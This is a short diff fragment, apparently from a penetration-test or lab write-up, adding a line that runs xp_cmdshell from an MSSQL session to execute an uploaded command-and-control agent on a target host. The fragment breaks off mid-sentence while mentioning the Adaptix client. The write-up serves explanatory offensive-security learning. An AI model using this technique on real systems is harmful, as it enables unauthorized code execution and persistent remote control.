@@ -68,5 +68,6 @@ SQL (sql_svc  dbo@master)>
 This uploaded the agent to the target
 
 ```python
-
+SQL (sql_svc  dbo@master)> xp_cmdshell C:\Users\Public\sql-agent.x64.exe
 ```
+This executed the agent so now if i look back at adaptix clie
